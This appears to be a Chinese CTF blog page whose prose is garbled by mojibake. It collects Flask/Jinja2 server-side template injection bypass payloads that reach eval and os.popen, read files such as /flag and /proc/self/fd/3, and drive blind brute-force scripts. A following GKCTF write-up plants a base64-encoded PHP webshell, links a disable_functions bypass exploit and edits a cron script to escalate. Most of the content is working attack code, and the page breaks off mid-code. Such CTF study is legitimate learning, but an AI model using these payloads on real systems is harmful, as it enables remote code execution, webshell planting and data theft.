<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; request.__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">192</span>).__init__.__globals__.__builtins__.__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-3-è¿‡æ»¤äº†-å·"><a href="#2-3-è¿‡æ»¤äº†-å·" class="headerlink" title="2.3 è¿‡æ»¤äº†.å·"></a>2.3 è¿‡æ»¤äº†.å·</h2><p>è¿™ä¸ªå¯ä»¥ä½¿ç”¨attræ¥è¿›è¡Œç»•è¿‡äº†ï¼Œç›´æ¥ç»™å‡ºç»•è¿‡æ–¹æ³•ï¼š</p>
<p>æ‰€ä»¥ä¹‹å‰çš„payloadè¿›è¡Œå¯¹æ¯”ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__ = []|attr(__class__)</span><br><span class="line">&#123;&#123;[]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()  &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;   ([]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">190</span>]  &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;   ([]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">192</span>]|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(__getitem__)(<span class="string">&#x27;eval&#x27;</span>)  &#125;&#125;</span><br><span class="line">    <span class="comment"># æ‹¼åˆ°è¿™é‡Œæ‹¼ä¸ä¸‹å»äº†ã€‚ã€‚è¯·é—®æœ‰äººçŸ¥é“ä¸ºä»€ä¹ˆå˜›,evalæ— è®ºå¦‚ä½•éƒ½å–ä¸åˆ°äº†</span></span><br></pre></td></tr></table></figure>

<p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨æˆ‘ä»ä¸Šå¾€ä¸‹ç»§ç»­å–å€¼çš„æ—¶å€™ï¼Œæ€ä¹ˆéƒ½æ²¡æ³•ç»§ç»­å‘ä¸‹å–å€¼äº†ã€‚ä½†æ˜¯çœ‹è§å¯ä»¥è½¬æ¢æ€è·¯</p>
<h2 id="2-5åˆ©ç”¨request"><a href="#2-5åˆ©ç”¨request" class="headerlink" title="2.5åˆ©ç”¨request"></a>2.5åˆ©ç”¨request</h2><p>â€‹    å› ä¸ºflaskæ­¤æ—¶èƒ½å…è®¸ç”¨æˆ·è‡ªå®šä¹‰è¾“å‡ºï¼Œåæœ‰å…«ä¹æ˜¯æœ‰requestçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å»åˆ©ç”¨è¿™ä¸ªä¹Ÿä¸æ˜¯ç›¸å½“ä¸é”™çš„</p>
<p>è¿™é‡Œç¿»é˜…åˆ°äº†ä¸€ä¸ªè€å¤–æ€è·¯ï¼Œä½†æ˜¯ä»–æ²¡ç»™å…¨ã€‚</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/?id=&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)|attr(&#x27;__base__&#x27;)      &#125;&#125;&amp;class=class&amp;usc=_&amp;init=init</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨requestçš„æ€è·¯å»é‡æ–°æŠŠpayloadæ‹¼å‡ºæ¥</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123;[][request[&#x27;args&#x27;][&#x27;class&#x27;]][request[&#x27;args&#x27;][&#x27;base&#x27;]][request[&#x27;args&#x27;][&#x27;subclasses&#x27;]]()[153][request[&#x27;args&#x27;][&#x27;dict&#x27;]][request[&#x27;args&#x27;][&#x27;init&#x27;]][request[&#x27;args&#x27;][&#x27;globals&#x27;]][request[&#x27;args&#x27;][&#x27;builtins&#x27;]][&#x27;eval&#x27;](request[&#x27;args&#x27;][&#x27;payload&#x27;])&#125;&#125;&amp;base=__base__&amp;subclasses=__subclasses__&amp;dict=__dict__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;class=__class__&amp;payload=__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()</span><br></pre></td></tr></table></figure>



<h2 id="2-4å°†ä¸­æ‹¬å·å’Œ-å·éƒ½è¿‡æ»¤æƒ…å†µä¸‹"><a href="#2-4å°†ä¸­æ‹¬å·å’Œ-å·éƒ½è¿‡æ»¤æƒ…å†µä¸‹" class="headerlink" title="2.4å°†ä¸­æ‹¬å·å’Œ.å·éƒ½è¿‡æ»¤æƒ…å†µä¸‹"></a>2.4å°†ä¸­æ‹¬å·å’Œ.å·éƒ½è¿‡æ»¤æƒ…å†µä¸‹</h2><p>å½“ç„¶ä¸Šé¢çš„éš¾åº¦éƒ½æ˜¯ç›¸å½“ç®€å•çš„é¢˜ç›®æ‰ä¼šé‡è§äº†ï¼Œåœ¨å½“å‰ç¯å¢ƒä¸‹ï¼Œå¾€å¾€ä¼šè¿‡æ»¤çš„ç›¸å½“ä¸¥æ ¼ï¼Œæˆ‘ä»¬åº”è¯¥ä»flaskæœ¬èº«å‡ºç°çš„ç±»å¼€å§‹æ‰¾ï¼Œæ¯”å¦‚é¢˜ç›®å¯èƒ½éªŒè¯çš„æ—¶å€™ï¼Œä»…ä»…éªŒè¯æˆ‘ä»¬è¾“å…¥çš„idã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ­¤ï¼Œè®©flaskè¯»å–headerä¸­çš„å†…å®¹ï¼Œè¿™æ ·å°±å¯ä»¥æ‰“ç ´é™åˆ¶</p>
<p>æˆ‘ä»¬å¯ä»¥å…ˆå†™ä¸€ä¸ªè„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">?id=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;dir()&quot;).read()&#x27;</span>) &#125;&#125;       </span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹‹åä¸ºäº†ç»•è¿‡æ‹¬å·çš„é™åˆ¶ï¼Œé‡‡ç”¨è¿™ç§æ–¹æ³•ï¼š</p>
<p>è¿™é‡Œç»™å‡ºä¸€ä¸ªpayloadï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> []|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> c|attr(request.headers.x4)==request.headers.x5 %&#125;</span><br><span class="line">    &#123;%<span class="keyword">for</span> d <span class="keyword">in</span> ((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])%&#125;</span><br><span class="line">        &#123;%<span class="keyword">if</span> d==request.headers.x9%&#125;&#123;&#123;((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])[d](request.headers.x13)&#125;&#125;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif%&#125;</span><br><span class="line">&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">x13: </span><br><span class="line">x9: <span class="built_in">eval</span></span><br><span class="line">x8: __builtins__</span><br><span class="line">x7: __globals__</span><br><span class="line">x6: __init__</span><br><span class="line">x5: catch_warnings</span><br><span class="line">x4: __name__</span><br><span class="line">x3: __subclasses__</span><br><span class="line">x2: __base__</span><br><span class="line">x1: __class__</span><br></pre></td></tr></table></figure>

<h2 id="2-6-è¿‡æ»¤äº†å•å¼•å·å’ŒåŒå¼•å·çš„æƒ…å†µ"><a href="#2-6-è¿‡æ»¤äº†å•å¼•å·å’ŒåŒå¼•å·çš„æƒ…å†µ" class="headerlink" title="2.6 è¿‡æ»¤äº†å•å¼•å·å’ŒåŒå¼•å·çš„æƒ…å†µ"></a>2.6 è¿‡æ»¤äº†å•å¼•å·å’ŒåŒå¼•å·çš„æƒ…å†µ</h2><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±åªèƒ½å»å°è¯•æŸ¥æ‰¾å„ç±»çš„openå‡½æ•°äº†ï¼Œæ²¡æœ‰åŠæ³•æ‰§è¡Œå‘½ä»¤äº†ï¼Œäºæ˜¯æŸ¥æ‰¾åˆ°ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read()</span><br></pre></td></tr></table></figure>

<p>ä¹‹åä¸ºäº†ç»•è¿‡å¼•å·çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬å°è¯•ä½¿ç”¨request.args.x1çš„æ–¹å¼è¿›è¡Œç»•è¿‡</p>
<p>æ‹¼å‡‘å¾—ï¼š</p>
<h2 id="2-7-è¯»å–æ–‡ä»¶"><a href="#2-7-è¯»å–æ–‡ä»¶" class="headerlink" title="2.7 è¯»å–æ–‡ä»¶"></a>2.7 è¯»å–æ–‡ä»¶</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1=flag</span><br></pre></td></tr></table></figure>

<p>è€Œå®é™…ä¸Šï¼Œæˆ‘å‘ç°ä¸­æ‹¬å·ä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œæ›¿ä»£çš„</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[request.args.x1](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;)    &#125;&#125;&amp;x1=eval</span><br></pre></td></tr></table></figure>

<p>æ‹¼å‡‘å¾—å‡ºï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[request.args.x1].popen(request.args.x2).read() &#125;&#125;&amp;x1=os&amp;x2=dir</span><br></pre></td></tr></table></figure>



<h2 id="2-8è¿‡æ»¤äº†evalï¼Œpopenï¼Œä¸¤ä¸ªå·¦èŠ±æ‹¬å·"><a href="#2-8è¿‡æ»¤äº†evalï¼Œpopenï¼Œä¸¤ä¸ªå·¦èŠ±æ‹¬å·" class="headerlink" title="2.8è¿‡æ»¤äº†evalï¼Œpopenï¼Œä¸¤ä¸ªå·¦èŠ±æ‹¬å·"></a>2.8è¿‡æ»¤äº†evalï¼Œpopenï¼Œä¸¤ä¸ªå·¦èŠ±æ‹¬å·</h2><p>è¿™é‡Œè®°å½•ä¸€ä¸‹è‡ªå·±å­¦ä¹ åˆ°çš„ä¸€é“é¢˜ç›®ï¼š</p>
<h3 id="ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›ï¼š"><a href="#ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›ï¼š" class="headerlink" title="ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›ï¼š"></a>ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›ï¼š</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span>__</span><br><span class="line">    name = request.args.get(<span class="string">&quot;name&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/help&#x27;,methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help</span>():</span></span><br><span class="line">    <span class="built_in">help</span> = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">e</span>):</span></span><br><span class="line">    <span class="comment">#No way to get flag!</span></span><br><span class="line">    os.system(<span class="string">&#x27;rm -f /flag&#x27;</span>)</span><br><span class="line">    url = name = request.args.get(<span class="string">&quot;name&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    r = request.path</span><br><span class="line">    r = request.data.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">        t = Template(<span class="string">&quot; Not found!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line">    t = Template(r + <span class="string">&quot; Not found!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜æ¯”è¾ƒæ–°æœ‰æ„æ€çš„ç‚¹åœ¨ä¸¤ä¸ªåœ°æ–¹ï¼š</p>
<p>è¿‡æ»¤äº†è¿™ä¸ªåœ°æ–¹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> r:</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†{ {} },è¿™æ ·å­çš„æƒ…å†µä»¥å‰è‡ªå·±æ²¡æœ‰é‡è¿‡ï¼Œåæ¥çŸ¥é“å¯ä»¥è¿›è¡Œç›²æ³¨ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥å°è¯•è¯»å–æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶çš„payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;your file name &quot;).read()[1:2] &#x3D;&#x3D; &quot;a&quot; %&#125;~p0~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œåˆ™ä¼šè¾“å‡º<del>p0</del>ï¼Œå¦åˆ™å°±ä¸ä¼šè¾“å‡ºã€‚ç¬¬äºŒç‚¹ï¼Œæˆ‘ä»¬è¯¥è¯»å–ä»€ä¹ˆæ–‡ä»¶å‘¢ï¼Ÿ</p>
<p>è¿™é‡Œè¿ç”¨äº†os.system(â€œrm -f /flagâ€)</p>
<p>é»˜è®¤çš„è¿›ç¨‹åˆ é™¤åä¼šå­˜æ”¾åœ¨æš‚æ—¶æ–‡ä»¶ä¸­ï¼Œè¿›ç¨‹ä¸ºï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/proc/self/fd/3</span><br></pre></td></tr></table></figure>

<p>æ•…ç¼–å†™è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&#x27;http://eci-2ze006f3h1dkgrldoskz.cloudeci1.ichunqiu.com:8888/a&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = requests.post(url, data=payload,headers=headers).text</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;~p0~&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sa=string.printable</span><br><span class="line"><span class="comment">#print(s)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> sa:</span><br><span class="line">        payload=<span class="string">&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/proc/self/fd/3&quot;).read()[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(</span><br><span class="line">            i + <span class="number">1</span>) + <span class="string">&#x27;] == &quot;&#x27;</span> + c + <span class="string">&#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(password)</span><br></pre></td></tr></table></figure>

<p>è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:8080&quot;</span></span><br><span class="line"><span class="built_in">list</span> = string.ascii_letters + string.digits+ <span class="string">&quot;-/_&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">999</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&#x27;] == &quot;&#x27;</span>+j+<span class="string">&#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data =&#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        res = requests.get(url,params=data).text</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;~p0~&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">            flag+=j</span><br><span class="line">            print(<span class="string">&quot;flag:&quot;</span> + flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>





<h2 id="2-8è¿‡æ»¤äº†ç©ºæ ¼ï¼Œrequests"><a href="#2-8è¿‡æ»¤äº†ç©ºæ ¼ï¼Œrequests" class="headerlink" title="2.8è¿‡æ»¤äº†ç©ºæ ¼ï¼Œrequests"></a>2.8è¿‡æ»¤äº†ç©ºæ ¼ï¼Œrequests</h2><p>payloadåŸºæœ¬æ²¡æœ‰å˜åŠ¨ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹è¿˜è¢«æ¶å¿ƒäº†ä¸€ä¸‹requestï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥è¿™æ ·ç”¨ï¼š</p>
<p>åŸæœ¬æ­£å¸¸çš„payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1&#x3D;flag</span><br></pre></td></tr></table></figure>

<p>æ”¹é€ åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;cat\x20&#x2F;flag&quot;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF</title>
    <url>/2020/10/27/GKCTF/</url>
    <content><![CDATA[<p>æŠ½ç©ºæŠŠGKCTFçš„é¢˜ç›®åˆ·äº†ï¼Œå…ˆä»ç¬¬ä¸€é¢˜å¼€å§‹è¯´å§</p>
<h1 id="1-Check-in"><a href="#1-Check-in" class="headerlink" title="1.Check in"></a>1.Check in</h1><p>è¯´æ˜¯ä¸€é“ç­¾åˆ°é¢˜ï¼Œä½†æ˜¯å¾—ç”¨åˆ°pwnçš„çŸ¥è¯†ã€è™½ç„¶expç›´æ¥å°±èƒ½æ‰“äº†</p>
<p>ç¬¬ä¸€æ­¥è®¿é—®å°±èƒ½å®¡è®¡åˆ°ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„åºåˆ—åŒ–ï¼Œæˆ‘ä»¬ç›´æ¥base64ç¼–ç Ginkgoä¹‹åçš„å€¼å³å¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?Ginkgo=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡åˆ°PHPçš„ä»£ç ï¼Œä¸‹ä¸€æ­¥æˆ‘ä»¬ä¼šå‘ç°è‡ªå·±èšå‰‘è¿æ¥ä¸ä¸Šï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½è‡ªå·±å†å†™ä¸€ä¸ªshelläº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?Ginkgo=ZXZhbCgkX1BPU1Rbc2FrYW5pXSk7AA==</span><br></pre></td></tr></table></figure>

<p>å¯†ç æ˜¯sakaniï¼Œä¹‹åå°±å¯ä»¥ç”¨èšå‰‘é“¾æ¥ä¸Šå»äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°flagæ²¡æ³•è¯»å•Šã€‚è€Œä¸”å› ä¸ºdisable_functionï¼Œæˆ‘ä»¬ æ²¡æœ‰åŠæ³•ä½¿ç”¨è™šæ‹Ÿç»ˆç«¯äº†ã€‚</p>
<p>ä½†æ˜¯æˆ‘ä»¬æŸ¥çœ‹ç‰ˆæœ¬ï¼Œç‰ˆæœ¬ä¸ºPHP7.3ï¼Œå¯ä»¥å°è¯•ç”¨å†…æ ¸æ¼æ´ææƒï¼Œåœ¨tmpç›®å½•ï¼ˆ777ï¼‰ï¼Œä¸Šä¼ exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//github.com/mm0r1/exploits</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ è¿™é‡Œçš„gcæ¼æ´ï¼Œä¹‹åæ‰§è¡Œå‘½ä»¤å³å¯</p>
<h1 id="2-è€å…«å°è¶…å¸‚å„¿"><a href="#2-è€å…«å°è¶…å¸‚å„¿" class="headerlink" title="2.è€å…«å°è¶…å¸‚å„¿"></a>2.è€å…«å°è¶…å¸‚å„¿</h1><p>æ ¹æ®è¿™ç¯‡æ–‡ç« å¯ä»¥åšå‡ºæ¥å‰åŠæ®µæˆåŠŸæ‹¿åˆ°shellï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.nctry.com&#x2F;1660.html</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä¼ å…¥æˆåŠŸä¹‹åè·¯å¾„ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;d315d6f1-ec5d-40f2-9c4f-358445b37fba.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;1.php</span><br></pre></td></tr></table></figure>

<p>ç”¨èšå‰‘è¿å…¥ï¼Œæ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagå´ä¸èƒ½è¯»ï¼Œè¯»atuo.shå¯ä»¥çŸ¥é“å®ƒæ¯åˆ†é’Ÿä¼šæ‰§è¡Œä¸€æ¬¡makeflaghint.pyï¼ŒåŒæ—¶å…¶æƒé™æ˜¯766ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æ”¹~ï¼Œé‚£æˆ‘ä»¬å»æ”¹è¿™ä¸ªpyçš„å†…å®¹è®©ä»–è¯»flagå³å¯ï¼Œç­‰ä¸€åˆ†é’Ÿï¼Œè¯»åˆ°flag</p>
<h1 id="3-EzNode"><a href="#3-EzNode" class="headerlink" title="3.EzNode"></a>3.EzNode</h1><p>å°±æ˜¯ä¸€ä¸ªå¾ˆåŸºç¡€çš„ä»£ç å®¡è®¡ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2020.1/WORKER2 è€æ¿è¯´ä¸ºäº†åæœŸæ–¹ä¾¿ä¼˜åŒ–</span></span><br><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) 